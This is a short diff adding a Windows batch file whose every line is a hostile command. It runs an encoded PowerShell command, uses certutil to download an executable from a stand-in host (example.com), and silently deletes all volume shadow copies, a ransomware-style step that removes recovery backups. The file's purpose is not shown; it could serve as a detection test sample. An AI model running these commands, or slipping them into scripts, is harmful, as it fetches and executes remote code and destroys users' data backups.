@@ -1,0 +1,4 @@
+@echo off
+powershell.exe -EncodedCommand aQB3AHIA
+certutil.exe -urlcache -f http://example.com/p.exe p.exe
+vssadmin delete shadows /all /quiet
